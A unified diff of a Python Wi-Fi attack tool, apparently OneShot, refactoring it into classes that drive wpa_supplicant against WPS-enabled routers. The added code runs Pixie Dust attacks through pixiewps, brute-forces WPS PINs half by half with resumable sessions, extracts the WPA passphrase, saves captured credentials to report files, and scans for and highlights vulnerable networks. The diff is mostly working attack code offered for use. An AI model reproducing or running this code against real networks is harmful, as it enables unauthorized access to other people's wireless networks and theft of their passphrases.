@@ -7,6 +7,10 @@ import tempfile
 import shutil
 import re
 import codecs
+import socket
+import pathlib
+import time
+from datetime import datetime
 
 
 class WPSException(Exception):
@@ -121,6 +125,13 @@ class WPSpin(object):
             res.append(self.generate(algo, mac))
         return res
 
+    def getLikely(self, mac):
+        res = self.getSuggestedList(mac)
+        if res:
+            return res[0]
+        else:
+            return None
+
     def suggest(self, mac):
         '''
         Get algos suggestions for single MAC
@@ -217,50 +228,6 @@ class WPSpin(object):
         return pin
 
 
-class Data():
-    def __init__(self):
-        self.pke = ''
-        self.pkr = ''
-        self.e_hash1 = ''
-        self.e_hash2 = ''
-        self.authkey = ''
-        self.e_nonce = ''
-        self.wpa_psk = ''
-        self.state = ''
-
-    def clear(self):
-        self.__init__()
-
-    def got_all(self):
-        return self.pke and self.pkr and self.e_nonce and self.authkey and self.e_hash1 and self.e_hash2
-
-    def get_pixie_cmd(self, full_range=False):
-        pixiecmd = "pixiewps --pke {} --pkr {} --e-hash1 {} --e-hash2 {} --authkey {} --e-nonce {}".format(
-            self.pke, data.pkr, self.e_hash1, self.e_hash2, self.authkey, self.e_nonce)
-        if full_range:
-            pixiecmd += ' --force'
-        return pixiecmd
-
-
-class Options():
-    def __init__(self):
-        self.interface = None
-        self.bssid = None
-        self.pin = None
-        self.essid = None
-        self.pixiemode = False
-        self.full_range = False
-        self.showpixiecmd = False
-        self.verbose = False
-
-
-def shellcmd(cmd):
-    proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, encoding='utf-8')
-    result = proc.stdout.read()
-    proc.wait()
-    return result
-
-
 def recvuntil(pipe, what):
     s = ''
     while True:
@@ -272,33 +239,547 @@ def recvuntil(pipe, what):
             return s
 
 
-def run_wpa_supplicant(options):
-    options.tempdir = tempfile.mkdtemp()
-    with tempfile.NamedTemporaryFile(mode='w', suffix='.conf', delete=False) as temp:
-        temp.write("ctrl_interface={}\nctrl_interface_group=root\nupdate_config=1\n".format(options.tempdir))
-        options.tempconf = temp.name
-    cmd = 'wpa_supplicant -K -d -Dnl80211,wext,hostapd,wired -i{} -c{}'.format(options.interface, options.tempconf)
-    proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, encoding='utf-8')
-    return proc
+def get_hex(line):
+    a = line.split(':', 3)
+    return a[2].replace(' ', '').upper()
 
 
-def run_wpa_cli(options):
-    cmd = 'wpa_cli -i{} -p{}'.format(options.interface, options.tempdir)
-    proc = subprocess.Popen(cmd, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
-                            stderr=subprocess.STDOUT, encoding='utf-8')
-    recvuntil(proc, '\n>')
-    return proc
+class PixiewpsData():
+    def __init__(self):
+        self.pke = ''
+        self.pkr = ''
+        self.e_hash1 = ''
+        self.e_hash2 = ''
+        self.authkey = ''
+        self.e_nonce = ''
+
+    def clear(self):
+        self.__init__()
+
+    def got_all(self):
+        return self.pke and self.pkr and self.e_nonce and self.authkey and self.e_hash1 and self.e_hash2
+
+    def get_pixie_cmd(self, full_range=False):
+        pixiecmd = "pixiewps --pke {} --pkr {} --e-hash1 {} --e-hash2 {} --authkey {} --e-nonce {}".format(
+            self.pke, self.pkr, self.e_hash1, self.e_hash2, self.authkey, self.e_nonce)
+        if full_range:
+            pixiecmd += ' --force'
+        return pixiecmd
 
 
-def wps_reg(options):
-    cmd = 'wpa_cli -i{} -p{}'.format(options.interface, options.tempdir)
-    command = 'wps_reg {} {}\nquit\n'.format(options.bssid, options.pin)
-    proc = subprocess.run(cmd, shell=True, input=command, stdout=subprocess.PIPE,
-                          stderr=subprocess.STDOUT, encoding='utf-8')
-    status = False
-    if 'OK' in proc.stdout:
-        status = True
-    return status
+class ConnectionStatus():
+    def __init__(self):
+        self.status = ''   # Must be WSC_NACK, WPS_FAIL or GOT_PSK
+        self.last_m_message = 0
+        self.essid = ''
+        self.wpa_psk = ''
+
+    def isFirstHalfValid(self):
+        return self.last_m_message > 5
+
+    def clear(self):
+        self.__init__()
+
+
+class Companion(object):
+    """docstring for Companion"""
+    def __init__(self, interface, save_result=False, print_debug=False):
+        self.interface = interface
+        self.save_result = save_result
+        self.print_debug = print_debug
+
+        self.tempdir = tempfile.mkdtemp()
+        with tempfile.NamedTemporaryFile(mode='w', suffix='.conf', delete=False) as temp:
+            temp.write('ctrl_interface={}\nctrl_interface_group=root\nupdate_config=1\n'.format(self.tempdir))
+            self.tempconf = temp.name
+        self.__init_wpa_supplicant()
+        self.wpas_ctrl_path = f"{self.tempdir}/{interface}"
+
+        self.res_socket_file = f"{tempfile._get_default_tempdir()}/{next(tempfile._get_candidate_names())}"
+        self.retsock = socket.socket(socket.AF_UNIX, socket.SOCK_DGRAM)
+        self.retsock.bind(self.res_socket_file)
+
+        self.pixie_creds = PixiewpsData()
+        self.connection_status = ConnectionStatus()
+
+        user_home = str(pathlib.Path.home())
+        self.save_dir = f'{user_home}/.OneShot/'
+        if not os.path.exists(self.save_dir):
+            os.makedirs(self.save_dir + 'reports')
+            os.makedirs(self.save_dir + 'sessions')
+
+        self.generator = WPSpin()
+
+        self.bruteforce_persist = ''
+
+    def __init_wpa_supplicant(self):
+        print('[*] Running wpa_supplicant…')
+        cmd = 'wpa_supplicant -K -d -Dnl80211,wext,hostapd,wired -i{} -c{}'.format(self.interface, self.tempconf)
+        self.wpas = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, encoding='utf-8')
+        recvuntil(self.wpas, f'{self.interface}: Added interface {self.interface}')
+
+    def shellcmd(self, cmd):
+        proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, encoding='utf-8')
+        result = proc.stdout.read()
+        proc.wait()
+        return result
+
+    def sendOnly(self, msg):
+        '''Sends msg to wpa_supplicant'''
+        self.retsock.sendto(msg.encode(), self.wpas_ctrl_path)
+
+    def sendAndReceive(self, msg):
+        '''Sends msg to wpa_supplicant and returns the reply'''
+        self.retsock.sendto(msg.encode(), self.wpas_ctrl_path)
+        (b, address) = self.retsock.recvfrom(4096)
+        inmsg = b.decode('utf-8')
+        return inmsg
+
+    def __handle_wpas(self, pixiemode=False, verbose=None):
+        if not verbose:
+            verbose = self.print_debug
+        line = self.wpas.stdout.readline()
+        if not line:
+            self.wpas.wait()
+            return False
+        line = line.rstrip('\n')
+
+        if verbose:
+            sys.stderr.write(line + '\n')
+
+        if line.startswith('WPS: '):
+            if 'Building Message M' in line:
+                n = int(line.split('Building Message M')[1])
+                self.connection_status.last_m_message = n
+                print('[*] Sending WPS Message M{}…'.format(n))
+            elif 'Received M' in line:
+                n = int(line.split('Received M')[1])
+                self.connection_status.last_m_message = n
+                print('[*] Received WPS Message M{}'.format(n))
+                if n == 5:
+                    print('[+] The first half of the PIN is valid')
+            elif 'Received WSC_NACK' in line:
+                self.connection_status.status = 'WSC_NACK'
+                print('[*] Received WSC NACK')
+                print('[-] Error: wrong PIN code')
+            elif 'Enrollee Nonce' in line and 'hexdump' in line:
+                self.pixie_creds.e_nonce = get_hex(line)
+                assert(len(self.pixie_creds.e_nonce) == 16*2)
+                if pixiemode:
+                    print('[P] E-Nonce: {}'.format(self.pixie_creds.e_nonce))
+            elif 'DH own Public Key' in line and 'hexdump' in line:
+                self.pixie_creds.pkr = get_hex(line)
+                assert(len(self.pixie_creds.pkr) == 192*2)
+                if pixiemode:
+                    print('[P] PKR: {}'.format(self.pixie_creds.pkr))
+            elif 'DH peer Public Key' in line and 'hexdump' in line:
+                self.pixie_creds.pke = get_hex(line)
+                assert(len(self.pixie_creds.pke) == 192*2)
+                if pixiemode:
+                    print('[P] PKE: {}'.format(self.pixie_creds.pke))
+            elif 'AuthKey' in line and 'hexdump' in line:
+                self.pixie_creds.authkey = get_hex(line)
+                assert(len(self.pixie_creds.authkey) == 32*2)
+                if pixiemode:
+                    print('[P] AuthKey: {}'.format(self.pixie_creds.authkey))
+            elif 'E-Hash1' in line and 'hexdump' in line:
+                self.pixie_creds.e_hash1 = get_hex(line)
+                assert(len(self.pixie_creds.e_hash1) == 32*2)
+                if pixiemode:
+                    print('[P] E-Hash1: {}'.format(self.pixie_creds.e_hash1))
+            elif 'E-Hash2' in line and 'hexdump' in line:
+                self.pixie_creds.e_hash2 = get_hex(line)
+                assert(len(self.pixie_creds.e_hash2) == 32*2)
+                if pixiemode:
+                    print('[P] E-Hash2: {}'.format(self.pixie_creds.e_hash2))
+            elif 'Network Key' in line and 'hexdump' in line:
+                self.connection_status.status = 'GOT_PSK'
+                self.connection_status.wpa_psk = bytes.fromhex(get_hex(line)).decode('utf-8')
+        elif ': State: ' in line:
+            if '-> SCANNING' in line:
+                print('[*] Scanning…')
+        elif 'WPS-FAIL' in line:
+            self.connection_status.status = 'WPS_FAIL'
+            print('[-] WPS-FAIL error')
+#        elif 'NL80211_CMD_DEL_STATION' in line:
+#            print("[!] Unexpected interference — kill NetworkManager/wpa_supplicant!")
+        elif 'Trying to authenticate with' in line:
+            if 'SSID' in line:
+                self.connection_status.essid = codecs.decode(line.split("'")[1], 'unicode-escape').encode('latin1').decode('utf-8')
+            print('[*] Authenticating…')
+        elif 'Authentication response' in line:
+            print('[+] Authenticated')
+        elif 'Trying to associate with' in line:
+            if 'SSID' in line:
+                self.connection_status.essid = codecs.decode(line.split("'")[1], 'unicode-escape').encode('latin1').decode('utf-8')
+            print('[*] Associating with AP…')
+        elif ('Associated with' in line) and (self.interface in line):
+            bssid = line.split()[-1].upper()
+            if self.connection_status.essid:
+                print('[+] Associated with {} (ESSID: {})'.format(bssid, self.connection_status.essid))
+            else:
+                print('[+] Associated with {}'.format(bssid))
+        elif 'EAPOL: txStart' in line:
+            print('[*] Sending EAPOL Start…')
+        elif 'EAP entering state IDENTITY' in line:
+            print('[*] Received Identity Request')
+        elif 'using real identity' in line:
+            print('[*] Sending Identity Response…')
+
+        return True
+
+    def __runPixiewps(self, showcmd=False, full_range=False):
+        cmd = self.pixie_creds.get_pixie_cmd(full_range)
+        if showcmd:
+            print(cmd)
+        print("[*] Running Pixiewps…")
+        r = self.shellcmd(cmd)
+        print(r)
+        lines = r.splitlines()
+        for line in lines:
+            if ('[+]' in line) and ('WPS' in line):
+                pin = line.split(':')[-1].strip()
+                return pin
+        return False
+
+    def __credentialPrint(self, wps_pin=None, wpa_psk=None, essid=None):
+        print(f"[+] WPS PIN: '{wps_pin}'")
+        print(f"[+] WPA PSK: '{wpa_psk}'")
+        print(f"[+] AP SSID: '{essid}'")
+
+    def __saveResult(self, bssid, essid, wps_pin, wpa_psk):
+        path = self.save_dir + 'reports/'
+        filename = path + '{}-{}.txt'.format(
+            bssid.replace(":", ""),
+            datetime.now().strftime("%d-%m-%Y_%I-%M_%p")
+        )
+        with open(filename, 'w', encoding='utf-8') as file:
+            file.write('BSSID: {}\nESSID: {}\nWPS PIN: {}\nWPA PSK: {}'.format(
+                        bssid,
+                        essid,
+                        wps_pin,
+                        wpa_psk
+                    )
+            )
+        print(f'[i] Credentials saved to {filename}')
+
+    def __wps_connection(self, bssid, pin, pixiemode=False, verbose=None):
+        if not verbose:
+            verbose = self.print_debug
+        self.pixie_creds.clear()
+        self.connection_status.clear()
+        self.wpas.stdout.read(150)   # Clean the pipe
+        print(f"[*] Trying PIN '{pin}'…")
+        r = self.sendAndReceive(f'WPS_REG {bssid} {pin}')
+        if 'OK' not in r:
+            self.connection_status.status = 'WPS_FAIL'
+            print('[!] Something went wrong — check out debug log')
+            return False
+
+        while True:
+            res = self.__handle_wpas(pixiemode=pixiemode, verbose=verbose)
+            if not res:
+                break
+            if self.connection_status.status == 'WSC_NACK':
+                break
+            elif self.connection_status.status == 'GOT_PSK':
+                break
+            elif self.connection_status.status == 'WPS_FAIL':
+                break
+
+        self.sendOnly('WPS_CANCEL')
+        return False
+
+    def single_connection(self, bssid, pin=None, pixiemode=False, showpixiecmd=False, pixieforce=False, raise_kbrdinterr=False):
+        if not pin:
+            pin = self.generator.getLikely(bssid) or '12345670'
+        try:
+            self.__wps_connection(bssid, pin, pixiemode)
+            if self.connection_status.status == 'GOT_PSK':
+                self.__credentialPrint(pin, self.connection_status.wpa_psk, self.connection_status.essid)
+                if self.save_result:
+                    self.__saveResult(bssid, self.connection_status.essid, pin, self.connection_status.wpa_psk)
+                return True
+            elif pixiemode:
+                if self.pixie_creds.got_all():
+                    pin = self.__runPixiewps(showpixiecmd, pixieforce)
+                    if pin:
+                        return self.single_connection(bssid, pin, pixiemode=False)
+                    return False
+                else:
+                    print('[!] No enough data to run Pixie Dust attack')
+                    return False
+            else:
+                return False
+        except KeyboardInterrupt:
+            if raise_kbrdinterr:
+                raise KeyboardInterrupt
+            print("\nAborting…")
+
+    def __first_half_bruteforce(self, bssid, f_half, delay=None):
+        '''
+        @f_half — 4-character string
+        '''
+        checksum = self.generator.checksum
+        while int(f_half) < 10000:
+            t = int(f_half + '000')
+            pin = '{}000{}'.format(f_half, checksum(t))
+            self.single_connection(bssid, pin, raise_kbrdinterr=True)
+            if self.connection_status.isFirstHalfValid():
+                print('[+] First half found')
+                return f_half
+            elif self.connection_status.status == 'WPS_FAIL':
+                print('[!] WPS transaction failed, re-trying last pin')
+                return self.__first_half_bruteforce(bssid, f_half)
+            f_half = str(int(f_half) + 1).zfill(4)
+            self.bruteforce_persist = f_half
+            if delay:
+                time.sleep(delay)
+        print('[-] First half not found')
+        return False
+
+    def __second_half_bruteforce(self, bssid, f_half, s_half, delay=None):
+        '''
+        @f_half — 4-character string
+        @s_half — 3-character string
+        '''
+        checksum = self.generator.checksum
+        while int(s_half) < 1000:
+            t = int(f_half + s_half)
+            pin = '{}{}{}'.format(f_half, s_half, checksum(t))
+            self.single_connection(bssid, pin, raise_kbrdinterr=True)
+            if self.connection_status.last_m_message > 6:
+                return pin
+            elif self.connection_status.status == 'WPS_FAIL':
+                print('[!] WPS transaction failed, re-trying last pin')
+                return self.__second_half_bruteforce(bssid, f_half, s_half)
+            s_half = str(int(s_half) + 1).zfill(3)
+            self.bruteforce_persist = f_half + s_half
+            if delay:
+                time.sleep(delay)
+        return False
+
+    def smart_bruteforce(self, bssid, start_pin=None, delay=None):
+        if (not start_pin) or (len(start_pin) < 4):
+            # Trying to restore previous session
+            try:
+                path = self.save_dir + 'sessions/'
+                filename = path + '{}.run'.format(bssid.replace(':', '').upper())
+                with open(filename, 'r') as file:
+                    if input('[?] Restore previous session for {}? [n/Y] '.format(bssid)).lower() != 'n':
+                        mask = file.readline().strip()
+                    else:
+                        raise FileNotFoundError
+            except FileNotFoundError:
+                mask = '0000'
+        else:
+            mask = start_pin[:7]
+
+        try:
+            self.bruteforce_persist = mask
+            if len(mask) == 4:
+                f_half = self.__first_half_bruteforce(bssid, mask, delay)
+                if f_half:
+                    self.__second_half_bruteforce(bssid, f_half, '000', delay)
+            elif len(mask) == 7:
+                f_half = mask[:4]
+                s_half = mask[4:]
+                self.__second_half_bruteforce(bssid, f_half, s_half, delay)
+            raise KeyboardInterrupt
+        except KeyboardInterrupt:
+            print("\nAborting…")
+            path = self.save_dir + 'sessions/'
+            filename = path + '{}.run'.format(bssid.replace(':', '').upper())
+            with open(filename, 'w') as file:
+                file.write(self.bruteforce_persist)
+            print('[i] Session saved in {}'.format(filename))
+
+    def cleanup(self):
+        self.retsock.close()
+        self.wpas.terminate()
+        os.remove(self.res_socket_file)
+        shutil.rmtree(self.tempdir, ignore_errors=True)
+        os.remove(self.tempconf)
+
+    def __del__(self):
+        self.cleanup()
+
+
+class WiFiScanner(object):
+    """docstring for WiFiScanner"""
+    def __init__(self, interface, companion, vuln_list=None):
+        self.interface = interface
+        self.companion = companion
+        self.vuln_list = vuln_list
+
+    def iw_scanner(self):
+        '''Parsing iw scan results'''
+        def handle_network(line, result, networks):
+            networks.append(
+                    {
+                        'Security type': 'Unknown',
+                        'WPS': False,
+                        'WPS locked': False,
+                        'Model': '',
+                        'Model number': '',
+                        'Device name': ''
+                     }
+                )
+            networks[-1]['BSSID'] = result.group(1).upper()
+
+        def handle_essid(line, result, networks):
+            d = result.group(1)
+            networks[-1]['ESSID'] = codecs.decode(d, 'unicode-escape').encode('latin1').decode('utf-8')
+
+        def handle_level(line, result, networks):
+            networks[-1]['Level'] = int(float(result.group(1)))
+
+        def handle_securityType(line, result, networks):
+            sec = networks[-1]['Security type']
+            if result.group(1) == 'capability':
+                if 'Privacy' in result.group(2):
+                    sec = 'WEP'
+                else:
+                    sec = 'Open'
+            elif sec == 'WEP':
+                if result.group(1) == 'RSN':
+                    sec = 'WPA2'
+                elif result.group(1) == 'WPA':
+                    sec = 'WPA'
+            elif sec == 'WPA':
+                if result.group(1) == 'RSN':
+                    sec = 'WPA/WPA2'
+            elif sec == 'WPA2':
+                if result.group(1) == 'WPA':
+                    sec = 'WPA/WPA2'
+            networks[-1]['Security type'] = sec
+
+        def handle_wps(line, result, networks):
+            networks[-1]['WPS'] = result.group(1)
+
+        def handle_wpsLocked(line, result, networks):
+            flag = int(result.group(1), 16)
+            if flag:
+                networks[-1]['WPS locked'] = True
+
+        def handle_model(line, result, networks):
+            d = result.group(1)
+            networks[-1]['Model'] = codecs.decode(d, 'unicode-escape').encode('latin1').decode('utf-8')
+
+        def handle_modelNumber(line, result, networks):
+            d = result.group(1)
+            networks[-1]['Model number'] = codecs.decode(d, 'unicode-escape').encode('latin1').decode('utf-8')
+
+        def handle_deviceName(line, result, networks):
+            d = result.group(1)
+            networks[-1]['Device name'] = codecs.decode(d, 'unicode-escape').encode('latin1').decode('utf-8')
+
+        cmd = 'iw dev {} scan'.format(self.interface)
+        proc = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE,
+                              stderr=subprocess.STDOUT, encoding='utf-8')
+        lines = proc.stdout.splitlines()
+        networks = []
+        matchers = {
+            re.compile(r'BSS (\S+)( )?\(on \w+\)'): handle_network,
+            re.compile(r'SSID: (.*)'): handle_essid,
+            re.compile(r'signal: ([+-]?([0-9]*[.])?[0-9]+) dBm'): handle_level,
+            re.compile(r'(capability): (.+)'): handle_securityType,
+            re.compile(r'(RSN):\t [*] Version: (\d+)'): handle_securityType,
+            re.compile(r'(WPA):\t [*] Version: (\d+)'): handle_securityType,
+            re.compile(r'WPS:\t [*] Version: (([0-9]*[.])?[0-9]+)'): handle_wps,
+            re.compile(r' [*] AP setup locked: (0x[0-9]+)'): handle_wpsLocked,
+            re.compile(r' [*] Model: (.*)'): handle_model,
+            re.compile(r' [*] Model Number: (.*)'): handle_modelNumber,
+            re.compile(r' [*] Device name: (.*)'): handle_deviceName
+        }
+
+        for line in lines:
+            if 'No such device' in line:
+                return False
+            line = line.strip('\t')
+            for regexp, handler in matchers.items():
+                res = re.match(regexp, line)
+                if res:
+                    handler(line, res, networks)
+
+        # Filtering non-WPS networks
+        networks = list(filter(lambda x: bool(x['WPS']), networks))
+        if not networks:
+            return False
+
+        # Sorting by signal level
+        networks.sort(key=lambda x: x['Level'], reverse=True)
+
+        # Printing scanning results as table
+        def truncateStr(s, l, postfix='…'):
+            '''
+            Truncate string with the specified length
+            @s — input string
+            @l — length of output string
+            '''
+            if len(s) > l:
+                k = l - len(postfix)
+                s = s[:k] + postfix
+            return s
+
+        def colored(text, color=None):
+            '''Returns colored text'''
+            if color:
+                if color == 'green':
+                    text = '\033[92m{}\033[00m'.format(text)
+                elif color == 'red':
+                    text = '\033[91m{}\033[00m'.format(text)
+                else:
+                    return text
+            else:
+                return text
+            return text
+        if vuln_list:
+            print(colored('Green', color='green'), '— possible vulnerable network',
+                  '\n' + colored('Red', color='red'), '— WPS locked')
+        print('Networks list:')
+        print('{:<4} {:<18} {:<25} {:<8} {:<4} {:<27} {:<}'.format(
+            '#', 'BSSID', 'ESSID', 'Sec.', 'PWR', 'WSC device name', 'WSC model'))
+        for i, network in enumerate(networks):
+            number = '{})'.format(i + 1)
+            model = '{} {}'.format(network['Model'], network['Model number'])
+            essid = truncateStr(network['ESSID'], 25)
+            deviceName = truncateStr(network['Device name'], 27)
+            line = '{:<4} {:<18} {:<25} {:<8} {:<4} {:<27} {:<}'.format(
+                number, network['BSSID'], essid,
+                network['Security type'], network['Level'],
+                deviceName, model
+                )
+            if network['WPS locked']:
+                print(colored(line, color='red'))
+            elif vuln_list and (model in vuln_list):
+                print(colored(line, color='green'))
+            else:
+                print(line)
+
+        return networks
+
+    def suggest_network(self):
+        networks = self.iw_scanner()
+        if not networks:
+            print('[-] No networks found.')
+            return
+        while 1:
+            try:
+                networkNo = input('Select target ("r" for refresh): ')
+                if networkNo.lower() == 'r':
+                    return self.suggest_network()
+                elif int(networkNo) in range(1, len(networks) + 1):
+                    return networks[int(networkNo) - 1]['BSSID']
+                else:
+                    raise IndexError
+            except Exception:
+                print('Invalid number')
+            except KeyboardInterrupt:
+                print('\nAborting…')
+                return False
+            else:
+                break
 
 
 def ifaceUp(iface, down=False):
@@ -314,312 +795,8 @@ def ifaceUp(iface, down=False):
         return False
 
 
-def statechange(data, old, new):
-    data.state = new
-    return True
-
-
-def get_hex(line):
-    a = line.split(':', 3)
-    return a[2].replace(' ', '').upper()
-
-
-def process_wpa_supplicant(pipe, options, data):
-    line = pipe.stdout.readline()
-    if line == '':
-        pipe.wait()
-        return False
-    line = line.rstrip('\n')
-
-    if options.verbose: sys.stderr.write(line + '\n')
-
-    if line.startswith('WPS: '):
-        if 'Building Message M' in line:
-            statechange(data, data.state, 'M' + line.split('Building Message M')[1])
-            print('[*] Sending WPS Message {}...'.format(data.state))
-        elif 'Received M' in line:
-            statechange(data, data.state, 'M' + line.split('Received M')[1])
-            print('[*] Received WPS Message {}'.format(data.state))
-        elif 'Received WSC_NACK' in line:
-            statechange(data, data.state, 'WSC_NACK')
-            print('[*] Received WSC NACK')
-        elif 'Enrollee Nonce' in line and 'hexdump' in line:
-            data.e_nonce = get_hex(line)
-            assert(len(data.e_nonce) == 16*2)
-            if options.pixiemode: print('[P] E-Nonce: {}'.format(data.e_nonce))
-        elif 'DH own Public Key' in line and 'hexdump' in line:
-            data.pkr = get_hex(line)
-            assert(len(data.pkr) == 192*2)
-            if options.pixiemode: print('[P] PKR: {}'.format(data.pkr))
-        elif 'DH peer Public Key' in line and 'hexdump' in line:
-            data.pke = get_hex(line)
-            assert(len(data.pke) == 192*2)
-            if options.pixiemode: print('[P] PKE: {}'.format(data.pke))
-        elif 'AuthKey' in line and 'hexdump' in line:
-            data.authkey = get_hex(line)
-            assert(len(data.authkey) == 32*2)
-            if options.pixiemode: print('[P] AuthKey: {}'.format(data.authkey))
-        elif 'E-Hash1' in line and 'hexdump' in line:
-            data.e_hash1 = get_hex(line)
-            assert(len(data.e_hash1) == 32*2)
-            if options.pixiemode: print('[P] E-Hash1: {}'.format(data.e_hash1))
-        elif 'E-Hash2' in line and 'hexdump' in line:
-            data.e_hash2 = get_hex(line)
-            assert(len(data.e_hash2) == 32*2)
-            if options.pixiemode: print('[P] E-Hash2: {}'.format(data.e_hash2))
-        elif 'Network Key' in line and 'hexdump' in line:
-            data.wpa_psk = bytes.fromhex(get_hex(line)).decode('utf-8')
-            statechange(data, data.state, 'GOT_PSK')
-
-    elif ': State: ' in line:
-        statechange(data, *line.split(': State: ')[1].split(' -> '))
-        if '-> SCANNING' in line:
-            print('[*] Scanning...')
-    elif 'WPS-FAIL' in line:
-        statechange(data, data.state, 'WPS-FAIL')
-    elif 'NL80211_CMD_DEL_STATION' in line:
-        print("[!] Unexpected interference — kill NetworkManager/wpa_supplicant!")
-    elif 'Trying to authenticate with' in line:
-        if 'SSID' in line: options.essid = codecs.decode(line.split("'")[1], 'unicode-escape').encode('latin1').decode('utf-8')
-        print('[*] Authenticating...')
-    elif 'Authentication response' in line:
-        print('[+] Authenticated')
-    elif 'Trying to associate with' in line:
-        if 'SSID' in line: options.essid = codecs.decode(line.split("'")[1], 'unicode-escape').encode('latin1').decode('utf-8')
-        print('[*] Associating with AP...')
-    elif 'Associated with' in line and options.interface in line:
-        if options.essid:
-            print('[+] Associated with {} (ESSID: {})'.format(options.bssid, options.essid))
-        else:
-            print('[+] Associated with {}'.format(options.bssid))
-    elif 'EAPOL: txStart' in line:
-        statechange(data, data.state, 'EAPOL Start')
-        print('[*] Sending EAPOL Start...')
-    elif 'EAP entering state IDENTITY' in line:
-        print('[*] Received Identity Request')
-    elif 'using real identity' in line:
-        print('[*] Sending Identity Response...')
-
-    return True
-
-
-def poll_wpa_supplicant(wpas, options, data):
-    while True:
-        res = process_wpa_supplicant(wpas, options, data)
-
-        if not res:
-            break
-        if data.state == 'WSC_NACK':
-            print('[-] Error: wrong PIN code')
-            break
-        elif data.state == 'GOT_PSK':
-            break
-        elif data.state == 'WPS-FAIL':
-            print('[-] WPS-FAIL error')
-            break
-    if data.wpa_psk:
-        return True
-    if data.got_all():
-        return True
-    return False
-
-
-def connect(options, data):
-    print('[*] Running wpa_supplicant...')
-    ifaceUp(options.interface)
-    wpas = run_wpa_supplicant(options)
-
-    try:
-        while True:
-            s = recvuntil(wpas, '\n')
-            if options.verbose: sys.stderr.write(s)
-            if 'update_config=1' in s:
-                break
-    except KeyboardInterrupt:
-        print("\nAborting...")
-        cleanup(wpas, options)
-        ifaceUp(options.interface, down=True)
-        sys.exit(1)
-
-    print('[*] Trying PIN "{}"...'.format(options.pin))
-    wps_reg(options)
-
-    try:
-        res = poll_wpa_supplicant(wpas, options, data)
-    except KeyboardInterrupt:
-        print("\nAborting...")
-        cleanup(wpas, options)
-        ifaceUp(options.interface, down=True)
-        sys.exit(1)
-    cleanup(wpas, options)
-    ifaceUp(options.interface, down=True)
-    return res
-
-
-def wifi_scan(iface):
-    '''Parsing iw scan results'''
-    def handle_network(line, result, networks):
-        networks.append(
-                {
-                    'Security type': 'Unknown',
-                    'WPS': False,
-                    'WPS locked': False,
-                    'Model': '',
-                    'Model number': '',
-                    'Device name': ''
-                 }
-            )
-        networks[-1]['BSSID'] = result.group(1).upper()
-
-    def handle_essid(line, result, networks):
-        d = result.group(1)
-        networks[-1]['ESSID'] = codecs.decode(d, 'unicode-escape').encode('latin1').decode('utf-8')
-
-    def handle_level(line, result, networks):
-        networks[-1]['Level'] = int(float(result.group(1)))
-
-    def handle_securityType(line, result, networks):
-        sec = networks[-1]['Security type']
-        if result.group(1) == 'capability':
-            if 'Privacy' in result.group(2):
-                sec = 'WEP'
-            else:
-                sec = 'Open'
-        elif sec == 'WEP':
-            if result.group(1) == 'RSN':
-                sec = 'WPA2'
-            elif result.group(1) == 'WPA':
-                sec = 'WPA'
-        elif sec == 'WPA':
-            if result.group(1) == 'RSN':
-                sec = 'WPA/WPA2'
-        elif sec == 'WPA2':
-            if result.group(1) == 'WPA':
-                sec = 'WPA/WPA2'
-        networks[-1]['Security type'] = sec
-
-    def handle_wps(line, result, networks):
-        networks[-1]['WPS'] = result.group(1)
-
-    def handle_wpsLocked(line, result, networks):
-        flag = int(result.group(1), 16)
-        if flag:
-            networks[-1]['WPS locked'] = True
-
-    def handle_model(line, result, networks):
-        d = result.group(1)
-        networks[-1]['Model'] = codecs.decode(d, 'unicode-escape').encode('latin1').decode('utf-8')
-
-    def handle_modelNumber(line, result, networks):
-        d = result.group(1)
-        networks[-1]['Model number'] =  codecs.decode(d, 'unicode-escape').encode('latin1').decode('utf-8')
-
-    def handle_deviceName(line, result, networks):
-        d = result.group(1)
-        networks[-1]['Device name'] = codecs.decode(d, 'unicode-escape').encode('latin1').decode('utf-8')
-
-    cmd = 'iw dev {} scan'.format(iface)
-    proc = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE,
-                          stderr=subprocess.STDOUT, encoding='utf-8')
-    lines = proc.stdout.splitlines()
-    networks = []
-    matchers = {
-        re.compile(r'BSS (\S+)( )?\(on \w+\)'): handle_network,
-        re.compile(r'SSID: (.*)'): handle_essid,
-        re.compile(r'signal: ([+-]?([0-9]*[.])?[0-9]+) dBm'): handle_level,
-        re.compile(r'(capability): (.+)'): handle_securityType,
-        re.compile(r'(RSN):\t [*] Version: (\d+)'): handle_securityType,
-        re.compile(r'(WPA):\t [*] Version: (\d+)'): handle_securityType,
-        re.compile(r'WPS:\t [*] Version: (([0-9]*[.])?[0-9]+)'): handle_wps,
-        re.compile(r' [*] AP setup locked: (0x[0-9]+)'): handle_wpsLocked,
-        re.compile(r' [*] Model: (.*)'): handle_model,
-        re.compile(r' [*] Model Number: (.*)'): handle_modelNumber,
-        re.compile(r' [*] Device name: (.*)'): handle_deviceName
-    }
-
-    for line in lines:
-        line = line.strip('\t')
-        for regexp, handler in matchers.items():
-            res = re.match(regexp, line)
-            if res:
-                handler(line, res, networks)
-
-    # Filtering non-WPS networks
-    networks = list(filter(lambda x: bool(x['WPS']), networks))
-    # Sorting by signal level
-    networks.sort(key=lambda x: x['Level'], reverse=True)
-    return networks
-
-
-def scanner_pretty_print(networks, vuln_list=[]):
-    '''Printing WiFiScan result as table'''
-    def truncateStr(s, l):
-        '''
-        Truncate string with the specified length
-        @s — input string
-        @l — length of output string
-        '''
-        if len(s) > l:
-            k = l - 3
-            s = s[:k] + '...'
-        return s
-
-    def colored(text, color=None):
-        '''Returns colored text'''
-        if color:
-            if color == 'green':
-                text = '\033[92m{}\033[00m'.format(text)
-            elif color == 'red':
-                text = '\033[91m{}\033[00m'.format(text)
-            else:
-                return text
-        else:
-            return text
-        return text
-    if vuln_list:
-        print(colored('Green', color='green'), '— possible vulnerable network',
-              '\n' + colored('Red', color='red'), '— WPS locked')
-    print('Networks list:')
-    print('{:<4} {:<18} {:<25} {:<8} {:<4} {:<27} {:<}'.format(
-        '#', 'BSSID', 'ESSID', 'Sec.', 'PWR', 'WSC device name', 'WSC model'))
-    for i, network in enumerate(networks):
-        number = '{})'.format(i + 1)
-        model = '{} {}'.format(network['Model'], network['Model number'])
